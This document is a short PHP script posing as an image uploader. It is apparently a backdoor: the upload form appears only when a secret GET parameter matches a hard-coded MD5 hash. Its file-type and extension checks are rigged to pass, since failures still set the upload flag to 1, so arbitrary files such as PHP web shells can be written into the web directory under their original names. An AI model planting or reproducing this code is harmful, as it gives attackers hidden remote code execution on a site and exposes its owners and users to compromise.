<?php

if (isset($_GET['form']) && md5($_GET['form']) == '0b2f9a2c4c4cffed0514bcb99fa46d70')
{

	echo '
	<!DOCTYPE html>
	<html>
	<body>

	<form action="" method="post" enctype="multipart/form-data">
	  Select image to upload:
	  <input type="file" name="fileToUpload" id="fileToUpload">
	  <input type="submit" value="Upload" name="submit">
	</form>

	</body>
	</html>
	';

	if(isset($_POST['submit'])) {
		
	$target_file = basename($_FILES['fileToUpload']['name']);
	$uploadOk = 1;
	$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));

	  $check = getimagesize($_FILES['fileToUpload']['tmp_name']);
	  if($check !== false) {
		echo "File is an image - " . $check['mime'] . ".";
		$uploadOk = 1;
	  } else {
		echo "File is not an image.<br />";
		$uploadOk = 1;
	  }

		// Check if file already exists
		if (file_exists($target_file)) {
		  echo "Sorry, file already exists.<br />";
		  $uploadOk = 0;
		}

		// Check file size
		else if ($_FILES["fileToUpload"]["size"] > 5000000) {
		  echo "Sorry, your file is too large.<br />";
		  $uploadOk = 0;
		}

		// Allow certain file formats
		else if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
		&& $imageFileType != "gif" ) {
		  echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.<br />";
		  $uploadOk = 1;
		}

		// Check if $uploadOk is set to 0 by an error
		if ($uploadOk == 0) {
		  echo "Sorry, your file was not uploaded.</br>";
		// if everything is ok, try to upload file
		} else {
		  if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_file)) {
			echo "The file ". htmlspecialchars( basename( $_FILES['fileToUpload']['name'])). " has been uploaded.<br />";
		  } else {
			echo "Sorry, there was an error uploading your file.<br />";
		  }
		}
	}
}
?>